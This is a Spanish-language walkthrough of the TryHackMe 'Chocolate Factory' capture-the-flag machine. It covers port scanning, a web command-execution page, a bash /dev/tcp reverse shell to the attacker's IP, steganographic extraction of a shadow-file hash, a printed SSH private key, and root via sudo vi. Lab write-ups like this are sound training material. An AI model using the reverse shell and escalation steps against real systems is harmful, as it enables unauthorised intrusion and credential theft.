# Chocolate Factory - TryHackMe

## Reconocimiento

Vamos a realizar un escaneo de puertos con nmap.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.129.167.153 -Pn -oG allPorts

PORT    STATE SERVICE    REASON
21/tcp  open  ftp        syn-ack ttl 62
22/tcp  open  ssh        syn-ack ttl 62
80/tcp  open  http       syn-ack ttl 62
100/tcp open  newacct    syn-ack ttl 62
101/tcp open  hostname   syn-ack ttl 62
102/tcp open  iso-tsap   syn-ack ttl 62
103/tcp open  gppitnp    syn-ack ttl 62
104/tcp open  acr-nema   syn-ack ttl 62
105/tcp open  csnet-ns   syn-ack ttl 62
106/tcp open  pop3pw     syn-ack ttl 62
107/tcp open  rtelnet    syn-ack ttl 62
108/tcp open  snagas     syn-ack ttl 62
109/tcp open  pop2       syn-ack ttl 62
110/tcp open  pop3       syn-ack ttl 62
111/tcp open  rpcbind    syn-ack ttl 62
112/tcp open  mcidas     syn-ack ttl 62
113/tcp open  ident      syn-ack ttl 62
114/tcp open  audionews  syn-ack ttl 62
115/tcp open  sftp       syn-ack ttl 62
116/tcp open  ansanotify syn-ack ttl 62
117/tcp open  uucp-path  syn-ack ttl 62
118/tcp open  sqlserv    syn-ack ttl 62
119/tcp open  nntp       syn-ack ttl 62
120/tcp open  cfdptkt    syn-ack ttl 62
121/tcp open  erpc       syn-ack ttl 62
122/tcp open  smakynet   syn-ack ttl 62
123/tcp open  ntp        syn-ack ttl 62
124/tcp open  ansatrader syn-ack ttl 62
125/tcp open  locus-map  syn-ack ttl 62
```

Veamos las versiones de los servicios que están corriendo en los puertos abiertos.

```bash
nmap -sCV -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 10.129.167.153

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.154.96
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d7:43:06:72:64:80:b7:09:9d:94:af:13:53:6e:29:56 (RSA)
|   256 64:53:fb:48:62:2a:65:4d:36:e5:27:73:67:b0:bf:35 (ECDSA)
|_  256 fa:7b:57:a7:b8:e0:8c:e5:35:b9:af:ea:79:44:01:97 (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

En el resto de puertos del 100 al 125 nos sale un mensaje como este:

```bash
112/tcp open  mcidas?
| fingerprint-strings: 
|   GenericLines, NULL: 
|     "Welcome to chocolate room!! 
|     ___.---------------.
|     .'__'__'__'__'__,` . ____ ___ \r
|     _:\x20 |:. \x20 ___ \r
|     \'__'__'__'__'_`.__| `. \x20 ___ \r
|     \'__'__'__\x20__'_;-----------------`
|     \|______________________;________________|
|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
|_    hope you wont drown Augustus"

```

Sin embargo, en el puerto 113 nos sale un mensaje diferente:

```bash
113/tcp open  ident?
| fingerprint-strings: 
|   DNSStatusRequestTCP, GenericLines, GetRequest, Help, LDAPBindReq, LDAPSearchReq, NULL, RPCCheck, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    http://localhost/key_rev_key <- You will find the key here!!!
```

Vemos que es un mensaje de un servidor ident, y nos da una pista de que podemos encontrar la llave en http://localhost/key_rev_key.

AL entrar a la web http://10.129.167.153

Vemos un login.

```bash
sqlmap -u "http://10.129.167.153/index.html" --dbs --batch --forms
```

No nos deja enumerar las bases de datos ni nos sale ningun error sql al intentar meternos con una comilla simple.

```bash
whatweb "http://10.129.167.153/index.html"                                                  
http://10.129.167.153/index.html [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.167.153], PasswordField[password]
```

Vemos que la web está corriendo en un servidor Apache 2.4.41 en Ubuntu Linux, y que hay un campo de contraseña.

Viendo el código fuente de la web, vemos esto:

```html
<body>
	<h1>Squirrel Room</h1>
	<div class="log">
	<form method="post" action="validate.php">
		<label for="uname">User Name:</label>
		<input type="text" name="uname" required><br><br>
		<label for="password">Password:</label>
		<input type="password" name="password" required><br><br>
		<input type="submit" name="submit" value="Log In">
	</form>
	</div>
</body>
```

Hace un post a validate.php, vamos a ver que hay en ese archivo.

```php
<script>alert('Incorrect Credentials');</script><script>window.location='index.html'</script>
```

Vemos que si las credenciales son incorrectas nos devuelve un alert y nos redirige a index.html.

Hagamos una enumeración de directorios con gobuster.

```bash
gobuster dir -u http://10.129.167.153 -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 200 --exclude-length 10701 -x txt,js,php,xml,bak

home.php             (Status: 200) [Size: 569]
validate.php         (Status: 200) [Size: 93]
```

Si nos metemos a home.php vemos que nos permite ejecutar comandos.

![alt text](image.png)

Tras ejecutar `ls` vemos lo siguiente:

```bash
 home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php 
```

Vamos a tratar de entablar una reverse shell:

/bin/bash -c 'bash -i >& /dev/tcp/192.168.154.96/443 0>&1'

```bash
www-data@ip-10-129-167-153:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo),108(lxd)
```
Hagamos un tratamiento de la tty

```bash
script /dev/null -c bash
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 40 cols 120
```

Hagamos lo sguiente para tratar de ver la key de la que nos habían hablado:

```bash
strings key_rev_key

 congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

Vamos a probar a entrar en ftp como anónimo porque no hemos probado.

```bash
ftp 10.129.167.153

-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
```

Vemos una foto, veamos si hay algo de esteganografía en ella.

```bash
exiftool gum_room.jpg
steghide gum_room.jpg
wrote extracted data to "b64.txt".
```

Vemos una clave en base 64, vamos a decodificarla.

```bash
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

Vemos el /etc/passwd, y vemos que hay un usuario llamado charlie, si nos metemos a su home vemos su clave privada de ssh, vamos a tratar de entrar con ella.

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
-----END RSA PRIVATE KEY-----
```

```bash
chmod 600 id_rsa
ssh -i id_rsa charlie@10.129.167.153

charlie@ip-10-129-167-153:/$ 
```

Veamos como escalar privilegios:

```bash
charlie@ip-10-129-167-153:/home$ sudo -l
User charlie may run the following commands on ip-10-129-167-153:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

Vemos que podemos ejecutar vi como root sin necesidad de contraseña, vamos a aprovecharlo para escalar privilegios.

https://gtfobins.org/gtfobins/vi/#shell

```bash
sudo /usr/bin/vi -c ':!/bin/bash' /dev/null

root@ip-10-129-167-153:/home# whoami
root
```

Dentro de /root vemos root.py con este código:

```python
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
```

Antes de nada vamos a intentar descifrar la contraseña de charlie.

Vamos a descifrar este hash en sha512crypt:

```bash
$6$J1Cmev6V$ifUMOM0VViXR0/8BKz7FLIG8mkT5i1QHdzAXV6A.9l8g51baubW6QK4CHKuKzRGL75cmc/W6hv3VNUSOukcmM1

john --wordlist=/usr/share/wordlists/rockyou.txt hash
2232             (?)     
```

En realidad la contraseña de charlie en la página era lo que encontramos en este archivo validate.php.

```php
cat validate.php 
<?php
        $uname=$_POST['uname'];
        $password=$_POST['password'];
        if($uname=="charlie" && $password=="cn7824"){
                echo "<script>window.location='home.php'</script>";
        }
        else{
                echo "<script>alert('Incorrect Credentials');</script>";
                echo "<script>window.location='index.html'</script>";
        }
?>
```

Vemos que la contraseña es `cn7824`.

Ahora sí, cuando nos pide la clave en root.py, vamos a poner la que encontramos en el archivo key_rev_key.

```bash
Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

Nos da este error:

ValueError: Fernet key must be 32 url-safe base64-encoded bytes.

Este error no debería de salir, total, que he obtenido el mensaje cifrado y lo he descifrado en mi equipolocal:

```bash
echo "gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ" | openssl enc -d -aes-256-cbc -A -a -k "-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=" 2>/dev/null || python3 -c 'from cryptography.fernet import Fernet; print(Fernet(b"-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=").decrypt(b"gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ").decode())'())'
```

Tras esto obtenemos la flag.

No entiendo por qué no me funcionaba en el propio root.py, pero bueno, al final he conseguido descifrar el mensaje y obtener la flag.